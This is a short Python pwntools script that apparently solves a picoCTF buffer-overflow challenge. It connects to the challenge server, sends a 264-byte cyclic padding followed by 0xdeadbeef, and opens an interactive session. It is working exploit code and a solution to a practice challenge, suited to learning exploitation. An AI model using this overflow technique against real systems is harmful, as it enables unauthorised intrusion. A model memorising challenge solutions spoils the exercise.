#!/usr/bin/python3

from pwn import *

elf = ELF('chall')

#io = process('./chall')

io = remote('mars.picoctf.net',31890)



payload = cyclic(256+8)+pack(0xdeadbeef)

io.sendline(payload)

io.interactive()
